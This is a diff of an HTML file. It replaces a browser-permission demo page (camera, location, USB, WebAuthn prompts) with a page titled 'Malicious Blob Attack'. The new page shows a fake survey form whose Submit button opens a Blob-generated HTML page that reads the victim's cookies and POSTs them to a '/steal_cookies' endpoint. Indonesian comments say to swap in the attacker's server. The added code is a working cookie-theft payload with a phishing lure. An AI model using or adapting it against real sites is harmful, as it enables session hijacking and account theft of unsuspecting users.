@@ -1,154 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Drop Me</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        .drop-area {
-            border: 2px dashed #333;
-            padding: 2em;
-            margin-top: 20px;
-            height: 200px;
-            position: relative;
-            text-align: center;
-        }
-    </style>
+    <meta charset="utf-8">
+    <title>Malicious Blob Attack</title>
 </head>
 <body>
+    <h1>Welcome to Our Survey!</h1>
+    <p>Please fill out the form below:</p>
+    
+    <form id="fakeForm">
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" required>
+        <br>
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required>
+        <br>
+        <button id="submitBtn" type="button">Submit</button> <!-- Perubahan di sini -->
+    </form>
 
-<h2>Drop in Here</h2>
-<div class="drop-area" ondragover="allowDrop(event)" ondrop="drop(event)">
-    Drop here!
-</div>
+    <script>
+        document.getElementById('submitBtn').addEventListener('click', () => {
+            // Simulasi Blob dengan XSS vulnerability
+            const blobContent = `
+                <html>
+                <head>
+                    <meta charset="UTF-8">
+                </head>
+                <body>
+                    <script>
+                        // Mengambil cookies korban dan mengirimnya ke server penyerang
+                        const cookies = document.cookie;
+                        const xhr = new XMLHttpRequest();
+                        xhr.open("POST", "http://localhost:3000/steal_cookies", true); // Ubah URL dengan server penyerang
+                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                        xhr.send("cookies=" + encodeURIComponent(cookies));
+                    <\/script>
+                </body>
+                </html>
+            `;
 
-<script>
-    function allowDrop(event) {
-        event.preventDefault();
-    }
-
-    function drop(event) {
-        event.preventDefault();
-        const action = event.dataTransfer.getData('action');
-        console.log("Dropped action:", action);
-
-        switch(action) {
-            case 'location':
-                triggerLocation();
-                break;
-            case 'camera':
-                triggerCamera();
-                break;
-            case 'microphone':
-                triggerMicrophone();
-                break;
-            case 'bluetooth':
-                triggerBluetooth();
-                break;
-            case 'screenShare':
-                triggerScreenShare();
-                break;
-            case 'usb':
-                triggerUSB();
-                break;
-            case 'webauthn':
-                triggerWebAuthn();
-                break;
-            default:
-                console.log("No action found for:", action);
-        }
-    }
-
-    // Geolocation
-    function triggerLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                alert(`Location: Lat=${position.coords.latitude}, Lon=${position.coords.longitude}`);
-            }, error => {
-                alert('Error retrieving location.');
-            });
-        } else {
-            alert("Geolocation is not supported by this browser.");
-        }
-    }
-
-    // Camera Access
-    function triggerCamera() {
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            alert('Camera access granted.');
-        })
-        .catch(err => {
-            alert('Camera access denied.');
+            // Membuat Blob dan membuka di tab baru (dalam event click untuk menghindari popup blocker)
+            const blob = new Blob([blobContent], { type: "text/html;charset=utf-8" });
+            const url = URL.createObjectURL(blob);
+            window.open(url, '_blank'); // Membuka Blob di tab baru
         });
-    }
-
-    // Microphone Access
-    function triggerMicrophone() {
-        navigator.mediaDevices.getUserMedia({ audio: true })
-        .then(stream => {
-            alert('Microphone access granted.');
-        })
-        .catch(err => {
-            alert('Microphone access denied.');
-        });
-    }
-
-    // Bluetooth
-    function triggerBluetooth() {
-        navigator.bluetooth.requestDevice({ acceptAllDevices: true })
-        .then(device => {
-            alert(`Bluetooth device selected: ${device.name}`);
-        })
-        .catch(err => {
-            alert('Bluetooth access denied.');
-        });
-    }
-
-    // Screen Share
-    function triggerScreenShare() {
-        navigator.mediaDevices.getDisplayMedia({ video: true })
-        .then(stream => {
-            alert('Screen sharing started.');
-        })
-        .catch(err => {
-            alert('Screen sharing denied.');
-        });
-    }
-
-    // USB Devices
-    function triggerUSB() {
-        navigator.usb.requestDevice({ filters: [] })
-        .then(device => {
-            alert(`USB device selected: ${device.productName}`);
-        })
-        .catch(err => {
-            alert('USB access denied.');
-        });
-    }
-
-    // WebAuthn Authentication
-    function triggerWebAuthn() {
-        const publicKey = {
-            challenge: new Uint8Array(26),
-            rp: { name: "WebAuthn Example" },
-            user: { id: new Uint8Array(16), name: "user", displayName: "User" },
-            pubKeyCredParams: [{ type: "public-key", alg: -7 }]
-        };
-
-        navigator.credentials.create({ publicKey })
-        .then(cred => {
-            alert('WebAuthn completed successfully.');
-        })
-        .catch(err => {
-            alert('WebAuthn failed.');
-        });
-    }
-
-</script>
-
+    </script>
 </body>
 </html>
